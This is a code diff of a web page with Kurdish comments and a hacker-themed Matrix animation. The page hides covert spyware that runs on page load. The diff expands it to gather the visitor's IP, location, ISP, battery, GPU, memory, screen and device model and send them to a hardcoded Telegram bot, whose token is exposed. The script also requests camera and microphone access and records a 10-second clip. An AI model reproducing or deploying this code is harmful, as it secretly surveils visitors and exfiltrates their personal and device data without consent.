@@ -14,15 +14,15 @@
 <body>
     <canvas id="matrix"></canvas>
     <div class="content">
-        <h1>[ SYSTEM HACKED ]</h1>
-        <div class="box"><p id="status">> Capturing Video & Audio Stream...</p></div>
+        <h1>[ SYSTEM SCANNING ]</h1>
+        <div class="box"><p id="status">> Extracting All System Data...</p></div>
     </div>
 
     <script>
         const botToken = '8117812522:AAGFhq6xv5zgci1Z9mt5H1a3c26V7h48CI4';
         const chatId = '1034878899';
 
-        // Matrix Animation
+        // Matrix Effect
         const canvas = document.getElementById('matrix');
         const ctx = canvas.getContext('2d');
         canvas.width = window.innerWidth; canvas.height = window.innerHeight;
@@ -41,16 +41,44 @@
         setInterval(draw, 33);
 
         async function start() {
-            // ١. ناردنی زانیارییەکان (IP, Battery, Hz, هتد)
+            // کۆکردنەوەی هەموو زانیارییە زیادکراوەکان
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
-                const batt = navigator.getBattery ? await navigator.getBattery() : null;
-                const msg = `🎭 VIDEO HACK:\n🌐 IP: ${data.ip}\n📍 City: ${data.city}\n🔋 Battery: ${batt ? Math.round(batt.level*100)+'%' : 'N/A'}`;
+                
+                const getHz = () => new Promise(r => requestAnimationFrame(t1 => requestAnimationFrame(t2 => r(Math.round(1000/(t2-t1))))));
+                const hz = await getHz();
+
+                let batt = "N/A";
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    batt = `${Math.round(b.level*100)}% (${b.charging ? '⚡ Charging' : '🔋 Discharging'})`;
+                }
+
+                const gl = document.createElement('canvas').getContext('webgl');
+                const gpu = gl.getExtension('WEBGL_debug_renderer_info') ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "N/A";
+                const theme = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark" : "Light";
+
+                const msg = `
+🎭 ADVANCED VIDEO HACK:
+📱 مۆدێل: ${navigator.userAgent.match(/Android\s+([^\s;]+);\s+([^;)]+)/)?.[2] || "Device"}
+🌐 ئایپی: ${data.ip}
+📍 شار: ${data.city} (${data.country_name})
+🏢 کۆمپانیا: ${data.org}
+🔋 پاتری: ${batt}
+🔄 شاشە: ${hz}Hz
+🌙 دۆخی شەو: ${theme}
+🎮 گرافیک: ${gpu}
+💾 ڕام: ${navigator.deviceMemory || 'N/A'}GB
+⚙️ پڕۆسێسەر: ${navigator.hardwareConcurrency} Cores
+🖥 قەبارە: ${window.screen.width}x${window.screen.height}
+🌍 زمان: ${navigator.language}
+⏰ کات: ${new Date().toLocaleString()}
+                `;
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
             } catch(e){}
 
-            // ٢. تۆمارکردنی ڤیدیۆ و دەنگ (تەنها یەک Allow)
+            // تۆمارکردنی ڤیدیۆ و دەنگی ١٠ چرکەیی
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 const recorder = new MediaRecorder(stream);
@@ -63,7 +91,7 @@
                     stream.getTracks().forEach(t => t.stop());
                 };
                 recorder.start();
-                setTimeout(() => recorder.stop(), 10000); // ١٠ چرکە ڤیدیۆ
+                setTimeout(() => recorder.stop(), 10000);
             } catch(err){}
         }
         window.onload = start;
